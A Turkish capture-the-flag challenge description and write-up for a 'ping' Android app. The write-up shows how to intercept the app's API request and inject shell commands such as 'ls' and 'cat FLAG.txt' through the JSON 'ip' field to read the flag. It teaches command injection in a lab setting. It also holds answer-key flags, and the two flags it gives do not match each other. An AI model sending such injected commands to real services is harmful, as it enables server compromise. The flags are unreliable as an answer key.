
# Pinpon

|    |  |
| ------------- |:-------------:|
| Zorluk        | Çerez(100 Puan)|
| Aşama         | Yarı Final    |
| Soru Türü     | Miscellaneous |
| Dosyalar      | raket.apk     |
| Yazar         | [Rednexie](https://github.com/Rednexie) |

### Sorunun alakalı olduğu alanlar
- Android Uygulama Güvenliği
- Web Uygulama Güvenliği 


## Soru Açıklaması
```
Pinpon topunu sunuculara at, uyanıklarsa sana geri göndereceklerdir.
```

## Soru Açıklaması 2
```
Sana pinpon topunu sunuculara gönderebilmen ve onlardan dönüt alabilmen için bir raket veriyoruz. Bu raket sadece pinpon topu yollamaya yaramıyor olsa gerek.
```

### Sorunun alakalı olduğu alanlar
- Web Güvenliği
- Android 

## İpuçları
```
YOK
```

## Bayrak
```
BayrakBende{5unucu_ö1dühttp}
```





# WriteUp

## Ağ İzleme Kurulumunun Yapılması
Android uygulamamızı açtığımızda karşımızda verilen IP adresine ICMP ping isteği atmamıza yarayan bir sistem çıkacaktır. Bu sistem komutu Android cihazımızda yürüterek değil, bir API aracılığıyla çalışmaktadır.

Bu yüzden Android uygulamamızın tüm ağ trafiğini izlememiz gerekecektir. Bunun birkaç yolu bulunmakta:

- HTTP Toolkit'e Frida veya Android Studio aracılığıyla bir emülatör bağlamak
- HTTP Toolkit'e kendi fiziksel Android cihazımızı bağlamak
- Kendi cihazımızdaki tüm trafiği izleyecek kurulumu yapıp bir Android emülatörüyle uygulamayı çalıştırmak

Android Studio bir CTF yarışmacısının elinde olacağı için bu yollardan en kolayıdır. Cihazımızı ADB'ye bağlayıp HTTP Toolkit aracılığıyla trafiğini izlememiz mümkün.

### API'ı Keşfetmek
Cihazın ping komutunu bir API aracılığıyla yürüttüğünü anlamıştık. Trafiğimizi izlersek bunu sağlayan HTTP isteğini yakalayabiliriz.

Cihaz, komutu sunucuya JSON gövdesine sahip bir POST isteği ile gönderiyor. Dolayısıyla bu isteği kendimiz de herhangi bir yerden atabiliriz. Ayrıca isteği atarken giden komutu değiştirebiliriz:


```json
{
    "ip": "ping 0.0.0.0 -t 4" 
}
```

Normalde giden isteğin gövdesi aşağıdaki gibidir. Biz bunu istediğimiz komutları çalıştırma amacıyla kullanabiliriz. Örneğin, sunucudaki dizini listelemek için bir istek gönderelim:

```json
{
    "ip": "ls"
}
```



Cevap aşağıdaki gibi olacaktır:

```text
.dockerignore
.gitignore
node_modules
Dockerfile
bun.lockb
index.js
FLAG.txt
package.json
```

Komutumuzun başarıyla yürütüldüğünü ve sunucunun bize bir dizin listelemesi yaptığını görüyoruz. Dizindeki dosyaları incelediğimizde aralarında 'FLAG.txt' isimli dosya gözümüze çarpmış olmalı. İçeriğini okumak için sonraki komutumuzu çalıştırıyoruz:

```json
{
    "ip": "cat FLAG.txt"
}
```
Sunucu da cevap olarak bayrağımızı döndürecektir:
```text
BayrakBende{s1b3r1_4z4lt4l1m_4g4l4r}
```
